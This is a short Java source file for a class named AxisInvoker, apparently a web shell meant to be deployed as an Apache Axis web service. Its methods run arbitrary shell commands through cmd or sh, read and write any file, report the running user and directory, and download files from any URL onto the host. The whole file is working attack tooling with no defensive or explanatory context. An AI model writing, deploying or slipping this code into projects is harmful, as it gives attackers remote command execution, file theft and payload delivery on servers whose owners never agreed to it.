import java.io.*;
import java.lang.*;
import java.lang.reflect.*;
import java.util.*;
import java.net.*;

public class AxisInvoker {

    public String info ()
    {
        return "user.name: " + System.getProperty("user.name") + "; user.dir: " + System.getProperty("user.dir");
    }

    public String read (String path) 
    {
        String content = null;
        File file      = new File (path);
        try {
            FileReader reader = new FileReader(file);
            char[] chars = new char[(int) file.length()];
            reader.read(chars);
            content = new String(chars);
            reader.close();
        } catch (IOException e) {
            content = "Exception: " + e.toString();
        }

        return content;
    }

    public String write (String path, String content) 
    {
        String result = "Success"; 
        FileOutputStream fout  = null;
        try {
            FileWriter fw     = new FileWriter(new File (path).getAbsoluteFile());
            BufferedWriter bw = new BufferedWriter(fw);
            bw.write (content); bw.close(); 
        } catch (Exception e) {
            result = "Exception: " + e.toString ();
        }

        return result;
    }

    public String download (String url, String file) 
        throws IOException
    {
        String result = "Success";
        BufferedInputStream in = null;
        FileOutputStream fout  = null;
        try {
            in   = new BufferedInputStream (new URL(url).openStream());
            fout = new FileOutputStream (file);

            final byte data[] = new byte[1024];
            int count;
            while ((count = in.read(data, 0, 1024)) != -1) 
            {
                fout.write(data, 0, count);
            }
        } catch (Exception e) {
            result = "Exception: " + e.toString ();
        } finally {
            if (in != null) {
                in.close();
            }
            if (fout != null) {
                fout.close();
            }
        }

        return result;
    }

    public String exec (String cmd) 
    {
        String output = "";

        try {
            ProcessBuilder builder;
            if (System.getProperty("os.name").startsWith("Windows"))
                builder = new ProcessBuilder ("cmd", "/c", cmd);
            else
                builder = new ProcessBuilder ("sh", "-c", cmd);

            Process proc  = builder.start ();
            BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));

            String s = reader.readLine();
            while (s != null) {
                output = output + s + "\n";
                s = reader.readLine();
            }
            reader.close();
        } catch (Exception ex) {
            output = "Exception: " + ex.getMessage();
        }

        return output;
    }

}
